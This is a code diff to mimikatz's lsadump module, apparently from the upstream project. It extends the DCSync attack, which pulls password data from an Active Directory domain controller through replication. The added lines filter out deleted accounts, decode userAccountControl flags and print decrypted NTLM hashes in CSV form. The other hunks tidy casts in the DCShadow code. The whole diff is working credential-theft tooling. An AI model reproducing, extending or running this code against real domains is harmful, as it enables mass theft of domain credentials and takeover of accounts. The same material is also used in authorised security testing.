@@ -18,11 +18,14 @@ LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
 	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
 	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
 	szOID_ANSI_currentValue,
+	szOID_isDeleted,
 };
 LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
 	szOID_ANSI_name,
 	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
-	szOID_ANSI_unicodePwd
+	szOID_ANSI_userAccountControl,
+	szOID_ANSI_unicodePwd,
+	szOID_isDeleted,
 };
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
@@ -38,7 +41,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
 	LPWSTR szTmpDc = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
-	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
+	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL), withDeleted = kull_m_string_args_byName(argc, argv, L"deleted", NULL, NULL), decodeUAC = kull_m_string_args_byName(argc, argv, L"uac", NULL, NULL);
 	
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
@@ -110,7 +113,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 													for(i = 0; i < getChRep.V6.cNumObjects; i++)
 													{
 														if(csvOutput)
-															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
+															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, withDeleted, decodeUAC);
 														else
 															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
 														pObject = pObject->pNextEntInf;
@@ -184,24 +187,46 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 	return status;
 }
 
-void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
+void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL withDeleted, BOOL decodeUAC)
 {
-	DWORD rid = 0;
-	PBYTE unicodePwd;
-	DWORD unicodePwdSize;
+	DWORD i, szData;
+	PBYTE data;
 	PVOID sid;
 	BYTE clearHash[LM_NTLM_HASH_LENGTH];
-	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
-		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
-		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
+
+	if(!withDeleted)
 	{
-		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
-		kprintf(L"%u\t", rid);
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_isDeleted, &data, &szData) && (szData == sizeof(BOOL)))
+			withDeleted = !*(PBOOL) data;
+		else withDeleted = TRUE;
+	}
+
+	if(withDeleted &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &data, &szData))
+	{
+		i = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
+		kprintf(L"%u\t", i);
 		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
 		kprintf(L"\t");
-		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
+		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(data, &i, clearHash)))
 			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
 		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
+		{
+			if(decodeUAC)
+			{
+				for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
+				{
+					kprintf(L"\t");
+					if((1 << i) & *(PDWORD) data)
+						kprintf(L"%s", KUHL_M_LSADUMP_UF_FLAG[i]);
+				}
+			}
+			else kprintf(L"\t%u", *(PDWORD) data);
+		}
 		kprintf(L"\n");
 	}
 }
@@ -218,13 +243,12 @@ void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLO
 		kuhl_m_lsadump_dcsync_descrSecret(prefixTable, attributes, someExport);
 }
 
-const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
+const wchar_t * KUHL_M_LSADUMP_UF_FLAG[32] = {
 	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
 	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
 	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
 	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
 };
-
 LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
 {
 	LPCWSTR target;
@@ -818,7 +842,6 @@ NTSTATUS kuhl_m_lsadump_dcshadow_encode(PDCSHADOW_PUSH_REQUEST request, int argc
 	BOOL cleanData = kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL), multipleValues = kull_m_string_args_byName(argc, argv, L"multiple", NULL, NULL);
 	UNICODE_STRING us;
 
-
 	if(kull_m_string_args_byName(argc, argv, L"object", &szObject, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"attribute", &szAttribute, NULL))
@@ -900,7 +923,6 @@ NTSTATUS kuhl_m_lsadump_dcshadow_view(PDCSHADOW_PUSH_REQUEST request)
 	}
 	return STATUS_SUCCESS;
 }
-
 
 PBERVAL kuhl_m_lsadump_dcshadow_getSingleAttr(PLDAP ld, PLDAPMessage pMessage, PCWCHAR attr)
 {
@@ -1769,7 +1791,7 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_val
 		*aes256 = NULL;
 		*aes128 = NULL;
 
-		ret = swscanf_s(theArg, L"%[^:]:%[^:]:%s", bSalt, (unsigned)ARRAYSIZE(bSalt), bAes256, (unsigned)ARRAYSIZE(bAes256), bAes128, (unsigned)ARRAYSIZE(bAes128));
+		ret = swscanf_s(theArg, L"%[^:]:%[^:]:%s", bSalt, (DWORD) ARRAYSIZE(bSalt), bAes256, (DWORD) ARRAYSIZE(bAes256), bAes128, (DWORD) ARRAYSIZE(bAes128));
 		if(ret > 1)
 		{
 			RtlInitUnicodeString(&uSalt, bSalt);
@@ -2841,7 +2863,7 @@ ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS 
 		{
 			if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_STRONG_ENCRYPTION)
 			{
-				size = ((PDRS_EXTENSIONS_INT) pextClient)->cb >= (DWORD)FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) ? FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) : FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid);
+				size = (ULONG) (((PDRS_EXTENSIONS_INT) pextClient)->cb >= (ULONG) FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) ? FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) : FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid));
 				if(*ppextServer = (DRS_EXTENSIONS *) midl_user_allocate(size))
 				{
 					RtlZeroMemory(*ppextServer, size);
@@ -2849,7 +2871,7 @@ ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS 
 					((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags = DRS_EXT_BASE | DRS_EXT_RESTORE_USN_OPTIMIZATION | DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8;
 					if(pDCShadowDomainInfoInUse->fUseSchemaSignature)
 						((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags |= DRS_EXT_POST_BETA3;
-					if(size >= (DWORD)FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt))
+					if(size >= (ULONG) FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt))
 						((PDRS_EXTENSIONS_INT) *ppextServer)->dwReplEpoch = (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) ? (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) : pDCShadowDomainInfoInUse->dwReplEpoch;
 				}
 				if(*phDrs = MIDL_user_allocate(sizeof(DWORD)))
